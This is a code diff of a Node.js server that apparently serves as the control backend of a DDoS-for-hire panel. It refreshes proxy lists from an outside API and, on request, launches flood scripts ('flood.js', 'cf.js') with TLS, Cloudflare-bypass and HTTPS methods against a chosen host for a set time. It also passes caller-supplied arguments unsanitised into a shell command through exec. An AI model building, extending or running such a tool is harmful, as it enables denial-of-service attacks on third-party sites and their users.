@@ -1,13 +1,12 @@
 const http = require('http');
 const https = require('https');
 const fs = require('fs');
-const { exec } = require('child_process'); // Sử dụng exec để chạy Python
+const { exec } = require('child_process');
 const url = require('url');
 const osu = require('os-utils');
 const port = 2222;
 let lastAPICallTime = Date.now();
 
-// Hàm fetchAndUpdateProxies giữ nguyên
 const fetchAndUpdateProxies = () => {
   const apiUrls = [
     'https://api.nminhniee.sbs/hp'
@@ -56,11 +55,10 @@ const fetchAndUpdateProxies = () => {
 fetchAndUpdateProxies();
 setInterval(fetchAndUpdateProxies, 30 * 60 * 1000);
 
-// Hàm runScript sửa để hỗ trợ cả JavaScript và Python
 const runScript = (scriptName, args) => {
   if (scriptName.endsWith('.py')) {
-    // Chạy file Python
-    const command = `python3 ${scriptName} ${args.join(' ')}`; // Sử dụng python3 (hoặc python tùy hệ thống)
+
+    const command = `python3 ${scriptName} ${args.join(' ')}`;
     const childProcess = exec(command, (error, stdout, stderr) => {
       if (error) {
         console.error(`Lỗi khi chạy ${scriptName}: ${error.message}`);
@@ -167,7 +165,7 @@ const server = http.createServer((req, res) => {
     lastAPICallTime = currentTime;
 
     if (method.toLowerCase() === 'tls') {
-      runScript('flood1.js', [host, time, '1', '30', 'prx1.txt']);
+      runScript('flood.js', [host, time, '1', '30', 'prx1.txt']);
     } else if (method.toLowerCase() === 'cf') {
       runScript('cf.js', ['GET', host, time, '2', '65', 'prx.txt']);
     } else if (method.toLowerCase() === 'https') {
